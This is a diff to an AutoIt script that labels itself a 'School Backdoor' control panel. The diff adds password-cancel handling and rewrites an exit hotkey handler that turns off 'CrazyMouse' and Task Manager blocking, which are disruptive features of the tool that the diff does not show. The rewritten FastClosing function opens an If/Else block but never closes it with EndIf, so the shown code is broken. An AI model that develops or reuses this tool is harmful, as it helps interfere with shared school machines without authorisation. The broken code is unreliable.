@@ -2,7 +2,7 @@
 
  Devil ControlPanel ( School Backdoor )
  AutoIt Version: 3.3.14.2
- Version: Beta 2 ( 17:09 11.09.2017)
+ Version: Beta 2.5 ( 20:45 11.09.2017)
 
 #ce ----------------------------------------------------------------------------
 
@@ -28,7 +28,9 @@ HotKeySet("{ESC}", "FastClosing")
 
 ; Password protection
 Local $Entered_Password = InputBox("Devil ControlPanel", "Enter the password to access the control panel!", "", "*", 270, 130)
-If Not($Entered_Password = $Password) Then
+If @error Then
+    Exit
+ElseIf Not($Entered_Password = $Password) Then
     MsgBox($MB_ICONERROR, "Devil Control Panel", "Wrong password!")
     Exit
 EndIf
@@ -299,8 +301,10 @@ EndFunc
 
 ; Exit
 Func FastClosing()
-    GUICtrlSetData($InputBox, "PublicData")
-    DisableCrazyMouse()
-    DisableBlockTaskManager()
-    Exit
+    If GUICtrlRead($InputBox) = "" Then
+        Exit
+    Else
+        DisableCrazyMouse()
+        DisableBlockTaskManager()
+        Exit
 EndFunc
